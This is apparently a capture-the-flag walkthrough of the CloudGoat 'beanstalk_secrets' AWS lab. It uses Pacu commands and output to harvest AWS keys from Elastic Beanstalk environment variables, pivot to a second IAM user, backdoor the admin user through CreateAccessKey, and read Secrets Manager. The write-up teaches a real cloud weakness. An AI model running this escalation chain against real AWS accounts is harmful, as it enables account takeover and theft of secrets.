# Beanstalk Secrets Walkthrough

This document describes the process used to complete the Beanstalk Secrets scenario from CloudGoat. 
The goal of the lab is to demonstrate how exposed credentials and IAM misconfigurations can lead to privilege escalation in an AWS environment.


## Attack Path

1. Initial AWS credentials obtained
2. Elastic Beanstalk enumeration
3. Secondary credentials discovered
4. IAM privilege escalation
5. Admin access obtained
6. Secrets Manager enumeration
7. Final flag retrieved

---

## Creating the Scenario

The lab environment is created using CloudGoat.

```bash
cloudgoat create beanstalk_secrets
```
# Initial Access

After launching the scenario, you will be provided with an AWS Access Key ID and Secret Access Key for the low-privileged user. Configure the AWS CLI profile with these credentials

## Configure the AWS CLI profile:
```bash
aws configure --profile beanstalk
```
## Verfiy Access
```bash
Configuring the profile - aws sts get-caller identity --profile beanstalk
```
```json
{
  "UserId": "AIDA****************",
  "Account": "114091642599",
  "Arn": "arn:aws:iam::114091642599:user/low_priv_user"
}
```
## Enumerating Elastic Beanstalk using Pacu
Use Pacu to enumerate Elastic Beanstalk applications and environments (to assess the permissions of the low-privileged user by enumerating available IAM actions)

Open the Pacu and start new session (0) -> import_keys beanstalk -> search for beanstalk -> Run elasticbeanstalk
```bash
run elasticbeanstalk__enum --region us-east-1
```

## Run the Elastic Beanstalk enumeration module:

```bash
run elasticbeanstalk__enum --region us-east-1
```
```javascript
// elasticbeanstalk__enum Output

Running module elasticbeanstalk__enum...
[elasticbeanstalk__enum] Enumerating BeanStalk data in region us-east-1...
[elasticbeanstalk__enum]   1 application(s) found in us-east-1.
[elasticbeanstalk__enum]   1 environment(s) found in us-east-1.

Potential secret discovered in environment variables:

SSHSourceRestriction => "tcp,22,22,0.0.0.0/0"

EnvironmentVariables =>
SECONDARY_SECRET_KEY = "wwV7XXXXXXXXXXXXXXXXXXXXA5k"
SECONDARY_ACCESS_KEY = "AKIARVEXXXXXXXXXXXXXXXK"
PYTHONPATH = "/var/app/venv/staging-LQM1lest/bin"

[elasticbeanstalk__enum]   1 configuration setting(s) found in us-east-1.

Secrets saved to:
"/home/kali/.local/share/pacu/beanstalk/downloads/beanstalk_secrets_beanstalk_us-east-1.txt"

[elasticbeanstalk__enum] elasticbeanstalk__enum completed.

MODULE SUMMARY
--------------
Applications Found: 1
Environments Found: 1
Configuration Groups: 1
Tagged Environments: 1
Potential Secrets Discovered: 3
```



Key Finding

Elastic Beanstalk environment variables contain AWS credentials.

## Extracted secondary credentials:
```bash

ACCESS_KEY: AKIARVEXXXXXXXXXXXXXXXK
SECONDARY_SECRET_KEY= wwV7XXXXXXXXXXXXXXXXXXXXA5k

```

## Pivot – Secondary IAM User
Configure a new AWS profile using the discovered credentials.

```bash
aws configure --profile second
```
## Verify identity

```bash
aws sts get-caller-identity --profile second
```

```javascript

{
  "UserId": "AIDAXXXXXXXXXXXXX",
  "Account": "xxxxxxxxxxxx",
  "Arn": "arn:aws:iam::xxxxxxxxxxxx:user/xxxx_secondary_user"
}

```
## Import these credentials into Pacu

``` bash
import_keys second
```
## Enumerating IAM Permissions

Use Pacu to enumerate permissions available to the secondary user. Check the available options for Iam in Pacu

``` bash
Pacu (beanstalk:imported-second) > search iam
```

```javascript
//output

[Category: ESCALATE]

    An IAM privilege escalation path finder and abuser.

  iam__privesc_scan

[Category: PERSIST]

    Adds API keys to other users.

    Adds a password to users without one.

    Creates assume-role trust relationships between users and roles.

  iam__backdoor_assume_role
  iam__backdoor_users_keys
  iam__backdoor_users_password

[Category: RECON_UNAUTH]

    Enumerates IAM roles in a separate AWS account, given the account ID.

    Enumerates IAM users in a separate AWS account, given the account ID.

  iam__enum_roles
  iam__enum_users

[Category: ENUM]

    Allows you to query enumerated user and role permissions.

    Checks if the active set of keys are known to be honeytokens.

    Enumerates permissions using brute force

    Enumerates users, roles, customer-managed policies, and groups.

    Generates and downloads an IAM credential report.

    This module decodes an access key ID to get the AWS account ID. Based on: https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489

Tries to get a confirmed list of permissions for the current (or all) user(s).

  iam__bruteforce_permissions
  iam__decode_accesskey_id
  iam__detect_honeytokens
  iam__enum_action_query
  iam__enum_permissions
  iam__enum_users_roles_policies_groups
  iam__get_credential_report
```
First we will use the option  iam__enum_permissions. This will display additional IAM permissions, including the ability to create an access key for other users

``` bash
 Pacu (beanstalk:imported-second) > run iam__enum_permissions
```
```javascript
//output
 Running module iam__enum_permissions...
[iam__enum_permissions] Confirming permissions for users:
[iam__enum_permissions]   cgidmyjyad3872_secondary_user...
[iam__enum_permissions]     List groups for user failed
[iam__enum_permissions]       FAILURE: MISSING REQUIRED AWS PERMISSIONS
[iam__enum_permissions]     List user policies failed
[iam__enum_permissions]       FAILURE: MISSING REQUIRED AWS PERMISSIONS
[iam__enum_permissions]     Confirmed Permissions for cgidmyjyad3872_secondary_user
[iam__enum_permissions] iam__enum_permissions completed.

[iam__enum_permissions] MODULE SUMMARY:

   0 Confirmed permissions for 0 user(s).
   0 Confirmed permissions for 0 role(s).
  14 Unconfirmed permissions for user: cgidmyjyad3872_secondary_user.
   0 Unconfirmed permissions for 0 role(s).
Type 'whoami' to see detailed list of permissions.

```

## To view the detailed permissions associated with the current user use:

``` bash
whoami
```
<details>

```javascript
//output
Pacu (beanstalk:imported-second) > whoami
{
  "UserName": "cgidmyjyad3872_secondary_user",
  "RoleName": null,
  "Arn": "arn:aws:iam::XXXXXXXXXXXX:user/cgidmyjyadXXXXXX_secondary_user",
  "AccountId": "XXXXXXXXXXXX",
  "UserId": "AIDARVEXXXXXXXXXXXXXXX3",
  "Roles": null,
  "Groups": [],
  "Policies": [
    {
      "PolicyName": "cgidmyjyad3872_secondary_policy",
      "PolicyArn": "arn:aws:iam::XXXXXXXXXXXX:policy/cgidmyjyadXXXXXX_secondary_policy"
    }
  ],
  "AccessKeyId": "AKIARVEXXXXXXXXXXXXXXXK",
  "SecretAccessKey": "wwV7XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "SessionToken": null,
  "KeyAlias": "imported-second",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": {
      "iam:createaccesskey": {
        "Resources": [
          "*"
        ]
      },
      "iam:listattacheduserpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicyversion": {
        "Resources": [
          "*"
        ]
      },
      "iam:getuser": {
        "Resources": [
          "*"
        ]
      },
      "iam:getrole": {
        "Resources": [
          "*"
        ]
      },
      "iam:listpolicyversions": {
        "Resources": [
          "*"
        ]
      },
"iam:listgroups": {
        "Resources": [
          "*"
        ]
      },
      "iam:getrolepolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:listpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:listroles": {
        "Resources": [
          "*"
        ]
      },
      "iam:listusers": {
        "Resources": [
          "*"
        ]
      },
      "iam:getgroup": {
        "Resources": [
          "*"
        ]
      },
      "iam:getpolicy": {
        "Resources": [
          "*"
        ]
      },
      "iam:listattachedrolepolicies": {
        "Resources": [
          "*"
        ]
      }
    },
    "Deny": {}
  }
  ```
</details>

## The most interesting permission here is

``` bash
iam:createaccesskey
```

## Privilege Escalation with CreateAccessKey

Next make use of the privilege escalation scanner  which we found when we ran iam__enum_permissions in Pacu to identify exploitable methods


``` bash
Pacu (beanstalk2:imported-beanstalk2) > run iam__privesc_scan --scan-only
```

This module will scan for permission misconfigurations to see where privilege escalation will be possible. Available attack paths will be presented to the
user and executed on if chosen. Warning: Due to the implementation in IAM policies, this module has a difficult time parsing "NotActions". If your user
has any NotActions associated with them, it is recommended to manually verify the results of this module. NotActions are noted with a "!" preceeding the
action when viewing the results of the "whoami"

```javascript
//output

Pacu (beanstalk:imported-second) > run iam__privesc_scan --scan-only
  Running module iam__privesc_scan...
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   POTENTIAL: AddUserToGroup
[iam__privesc_scan]   POTENTIAL: AttachGroupPolicy
[iam__privesc_scan]   POTENTIAL: AttachRolePolicy
[iam__privesc_scan]   POTENTIAL: AttachUserPolicy
[iam__privesc_scan]   POTENTIAL: CodeStarCreateProjectFromTemplate
[iam__privesc_scan]   POTENTIAL: CodeStarCreateProjectThenAssociateTeamMember
[iam__privesc_scan]   CONFIRMED: CreateAccessKey
[iam__privesc_scan]   POTENTIAL: CreateEC2WithExistingIP
[iam__privesc_scan]   POTENTIAL: CreateLoginProfile
[iam__privesc_scan]   POTENTIAL: CreateNewPolicyVersion
[iam__privesc_scan]   POTENTIAL: EditExistingLambdaFunctionWithRole
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewCloudFormation
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewCodeStarProject
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewDataPipeline
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewGlueDevEndpoint
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewLambdaThenInvoke
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewLambdaThenInvokeCrossAccount
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo
[iam__privesc_scan]   POTENTIAL: PassExistingRoleToNewLambdaThenTriggerWithNewDynamo
[iam__privesc_scan]   POTENTIAL: PutGroupPolicy
[iam__privesc_scan]   POTENTIAL: PutRolePolicy
[iam__privesc_scan]   POTENTIAL: PutUserPolicy
[iam__privesc_scan]   POTENTIAL: SetExistingDefaultPolicyVersion
[iam__privesc_scan]   POTENTIAL: UpdateExistingGlueDevEndpoint
[iam__privesc_scan]   POTENTIAL: UpdateLoginProfile
[iam__privesc_scan]   POTENTIAL: UpdateRolePolicyToAssumeIt

[iam__privesc_scan] iam__privesc_scan completed.

[iam__privesc_scan] MODULE SUMMARY:

  Scan Complete

```
Notice that the CreateAccessKey method is confirmed as a viable escalation vector. Now execute the method to target the administrator user

``` bash
Pacu (beanstalk2:imported-beanstalk2) > run iam__privesc_scan --user-methods CreateAccessKey
```
Follow the prompts to select the admin user. Pacu will then generate a new access key for the admin user and display the credentials.

```javascript
//output

Running module iam__privesc_scan...
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   CONFIRMED: CreateAccessKey
[iam__privesc_scan] Attempting confirmed privilege escalation methods...

[iam__privesc_scan]   Starting method CreateAccessKey...

[iam__privesc_scan]     Is there a specific user you want to target? They must not already have two sets of access keys created for their user. Enter their user name now or just hit enter to enumerate users and view a list of options: 
[iam__privesc_scan] Data (IAM > Users) not found, run module "iam__enum_users_roles_policies_groups" to fetch it? (y/n) y
[iam__privesc_scan]   Running module iam__enum_users_roles_policies_groups...
[iam__enum_users_roles_policies_groups] Found 4 users
[iam__enum_users_roles_policies_groups] iam__enum_users_roles_policies_groups completed.

[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  4 Users Enumerated
  IAM resources saved in Pacu database.

[iam__privesc_scan] Found 4 user(s). Choose a user below.
[iam__privesc_scan]   [0] Other (Manually enter user name)
[iam__privesc_scan]   [1] cgidmyjyad3872_admin_user
[iam__privesc_scan]   [2] cgidmyjyad3872_low_priv_user
[iam__privesc_scan]   [3] cgidmyjyad3872_secondary_user
[iam__privesc_scan]   [4] Cloudgoat
[iam__privesc_scan] Choose an option:

```
Notice that we have one admin user so, we choose option 1. 

```javascript
//output

[iam__privesc_scan] Choose an option: 1
[iam__privesc_scan]   Running module iam__backdoor_users_keys...
[iam__backdoor_users_keys] Backdoor the following users?
[iam__backdoor_users_keys]   cgidmyjyad3872_admin_user
[iam__backdoor_users_keys]     Access Key ID: AKIARVEXXXXXXXXXXXXXWG
[iam__backdoor_users_keys]     Secret Key: fJ+UXXXXXXXXXXXXXXXXXXXXXXXXXXXXA1
[iam__backdoor_users_keys] iam__backdoor_users_keys completed.

[iam__backdoor_users_keys] MODULE SUMMARY:

  1 user key(s) successfully backdoored.

[iam__privesc_scan] iam__privesc_scan completed.

[iam__privesc_scan] MODULE SUMMARY:

  Privilege escalation was successful

Pacu (beanstalk:imported-second) >
```
Pacu creates a new access key for the admin user.

```javascript
cgidmyjyad3872_admin_user
Access Key ID: AKIARVEXXXXXXXXXXXXXWG
Secret Key: fJ+UXXXXXXXXXXXXXXXXXXXXXXXXXXXXA1
```
## Configuring the Admin Profile

Using the new admin credentials, set up an AWS CLI profile

```bash
aws configure --profile admin
```
Verify access

```bash
aws sts get-caller-identity --profile admin

```

```javascript
//output

{
    "UserId": "AIDARVEXXXXXXXXXXXXXX5",
    "Account": "XXXXXXXXXXXX",
    "Arn": "arn:aws:iam::XXXXXXXXXXXX:user/cgidmyjyadXXXXXX_admin_user"
}
```

#B ack to pacu

## Import the admin credentials into Pacu.

```bash
import_keys admin
```
## Retrieving the Final Flag

Finally, with admin privileges, run the secrets enumeration module to retrieve the final flag:

```javascript

Pacu (beanstalk3:imported-admin) > run secrets__enum --region us-east-1

```
This module will enumerate secrets in AWS Secrets Manager and AWS Systems manager parameter store

```javascript
//output

Pacu (beanstalk:imported-admin) > run secrets__enum --region us-east-1
  Running module secrets__enum...
[secrets__enum] Starting region us-east-1...
[secrets__enum]  Found secret: cgidmyjyad3872_final_flag
[secrets__enum] Probing Secret: cgidmyjyad3872_final_flag
[secrets__enum] Probing parameter store
[secrets__enum] secrets__enum completed.

[secrets__enum] MODULE SUMMARY:

    1 Secret(s) were found in AWS secretsmanager
'    0 Parameter(s) were found in AWS Systems Manager Parameter Store    
    Check ~/.local/share/pacu/<session name>/downloads/secrets/ to get the value
```
## Navigate to the Pacu output directory.

```javascript
cat ~/.local/share/pacu/<session>/downloads/secrets/secrets_manager/secrets.txt
```
## Final flag

``` javascript
xxxx_final_flag: FLAG{xxxxxxxxxxxxxxxxxxxxxxxx}
```

## Conclusion
==========

This lab highlights a common cloud security issue: **storing sensitive credentials inside Elastic Beanstalk environment variables**.

An attacker with access to these resources can:

1. Enumerate Elastic Beanstalk configuration.
2. Extract embedded AWS credentials.
3. Pivot into additional IAM users.
4. Identify privilege escalation paths.
5. Create access keys for higher-privileged users.
6. Access sensitive secrets stored in AWS Secrets Manager.
Access sensitive secrets stored in AWS Secrets Manager.
